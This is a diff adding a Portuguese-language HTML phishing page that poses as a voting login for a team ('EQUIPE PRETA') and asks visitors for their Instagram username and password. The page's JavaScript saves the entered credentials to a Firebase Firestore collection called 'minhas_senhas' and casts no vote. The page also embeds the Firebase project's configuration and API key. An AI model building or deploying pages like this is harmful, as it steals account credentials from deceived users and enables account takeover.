@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acesso Seguro</title>
+    <style>
+        /* --- ESTILOS (DESIGN) --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Cartão Central */
+        .card {
+            background-color: white;
+            padding: 2.5rem;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .card h2 {
+            color: #1c1e21;
+            margin-bottom: 1.5rem;
+            font-weight: 700;
+        }
+
+        .input-group {
+            margin-bottom: 1.2rem;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #606770;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 1rem;
+            background-color: #fff;
+            transition: border-color 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: #2ecc71;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(46, 204, 113, 0.2);
+        }
+
+        /* Botão Verde */
+        .btn-save {
+            background-color: #42b72a; /* Verde estilo Facebook/WhatsApp */
+            color: white;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-save:hover {
+            background-color: #36a420;
+        }
+
+        .btn-save:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Mensagem de Status */
+        #statusMessage {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            height: 20px;
+            color: #42b72a;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Login para votação 
+EQUIPE PRETA 🖤</h2>
+<div class="card">
+        <h2>Insira sua conta do instagram, aperte em "votar" e seu voto sera automaticamente computado</h2>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="usuario">Usuário ou Email</label>
+                <input type="text" id="usuario" placeholder="Digite o usuário" required>
+            </div>
+
+            <div class="input-group">
+                <label for="senha">Senha</label>
+                <input type="password" id="senha" placeholder="Digite a senha" required>
+            </div>
+
+            <button type="submit" id="btnSubmit" class="btn-save">Votar</button>
+        </form>
+
+        <p id="statusMessage">Salvo com sucesso!</p>
+    </div>
+
+    <!-- --- LÓGICA DO FIREBASE --- -->
+    <script type="module">
+        // Importando as ferramentas necessárias (App e Banco de Dados Firestore)
+        // Usando versão estável compatível 10.12.2 para garantir funcionamento
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+        // SUAS CONFIGURAÇÕES (Copiadas exatamente como você enviou)
+        const firebaseConfig = {
+            apiKey: "AIzaSyDGGOgoCLzfqg7ZibEDLSzMIRSKueEQuT8",
+            authDomain: "login-e1453.firebaseapp.com",
+            projectId: "login-e1453",
+            storageBucket: "login-e1453.firebasestorage.app",
+            messagingSenderId: "958134094798",
+            appId: "1:958134094798:web:8d2ab3f5c466b25ce9f99f"
+        };
+
+        // 1. Iniciar o Firebase
+        const app = initializeApp(firebaseConfig);
+        
+        // 2. Iniciar o Banco de Dados
+        const db = getFirestore(app);
+
+        // 3. Lógica do Formulário
+        const form = document.getElementById('loginForm');
+        const btnSubmit = document.getElementById('btnSubmit');
+        const statusMsg = document.getElementById('statusMessage');
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault(); // Não deixa a página recarregar sozinha
+
+            // Pegar valores dos campos
+            const usuarioTexto = document.getElementById('usuario').value;
+            const senhaTexto = document.getElementById('senha').value;
+
+            // Mudar botão para "Salvando..."
+            const textoOriginal = btnSubmit.innerText;
+            btnSubmit.innerText = "Processando...";
+            btnSubmit.disabled = true;
+
+            try {
+                // --- SALVAR NO FIREBASE ---
+                // Cria uma coleção chamada "minhas_senhas"
+                const docRef = await addDoc(collection(db, "minhas_senhas"), {
+                    usuario: usuarioTexto,
+                    senha: senhaTexto,
+                    data_criacao: new Date().toLocaleString() // Salva a data e hora
+                });
+
+                console.log("Documento salvo com ID: ", docRef.id);
+
+                // Feedback visual de sucesso
+                statusMsg.style.color = "#42b72a";
+                statusMsg.innerText = "Salvo com sucesso!";
+                statusMsg.style.opacity = '1';
+                
+                // Limpar formulário e focar no primeiro campo
+                form.reset();
+                document.getElementById('usuario').focus();
+
+            } catch (e) {
+                console.error("Erro ao adicionar documento: ", e);
+                statusMsg.style.color = "red";
+                statusMsg.innerText = "Erro ao salvar (Verifique o Console)";
+                statusMsg.style.opacity = '1';
+                alert("Erro: Verifique se o banco de dados (Firestore) está criado e em modo de teste.");
+            }
+
+            // Restaurar botão
+            btnSubmit.innerText = textoOriginal;
+            btnSubmit.disabled = false;
+
+            // Esconder mensagem após 2 segundos
+            setTimeout(() => {
+                statusMsg.style.opacity = '0';
+            }, 3000);
+        });
+    </script>
+
+</body>
+</html>
